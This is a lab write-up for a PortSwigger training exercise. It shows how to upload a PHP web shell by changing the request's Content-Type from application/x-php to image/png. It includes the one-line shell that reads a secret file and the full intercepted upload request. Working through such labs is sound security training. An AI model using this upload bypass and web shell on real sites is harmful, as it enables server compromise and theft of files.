# Lab Writeup: Web shell upload via Content-Type restriction bypass

URL: https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/file-upload-apprentice/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

## Description

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

1. Login as `wiener:peter`
2. Create a php file with the following content:

   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```

3. Upload the file as profile image
4. Intercept the upload POST request, then send it to repeater, you'll see the following request

   ```
    POST /my-account/avatar HTTP/2
    Host: 0a000010048981d782880627003e00a6.web-security-academy.net
    Cookie: session=37MwL2okivRd0UoHiyYzevwgXHLyDx1L
    Content-Length: 465
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Linux"
    Upgrade-Insecure-Requests: 1
    Origin: https://0a000010048981d782880627003e00a6.web-security-academy.net
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylFFAqzQ4EBEcyiLd
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a000010048981d782880627003e00a6.web-security-academy.net/my-account?id=wiener
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    Priority: u=0, i

    ------WebKitFormBoundarylFFAqzQ4EBEcyiLd
    Content-Disposition: form-data; name="avatar"; filename="rce.php"
    Content-Type: application/x-php

    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ------WebKitFormBoundarylFFAqzQ4EBEcyiLd
    Content-Disposition: form-data; name="user"

    wiener
    ------WebKitFormBoundarylFFAqzQ4EBEcyiLd
    Content-Disposition: form-data; name="csrf"

    NaDHdWRoKbw0ziKmeksY4jgk1e7mQ1Bj
    ------WebKitFormBoundarylFFAqzQ4EBEcyiLd--

   ```

5. Change the `Content-Type: application/x-php` to `Content-Type: image/png` then send the request again
6. Open the uploaded profile image in new tab then you can see the secret value `k5EL1sxGYAOzrpxazkuQiahdWGTOAMOs`
7. Submit the secret value and the lab is solved
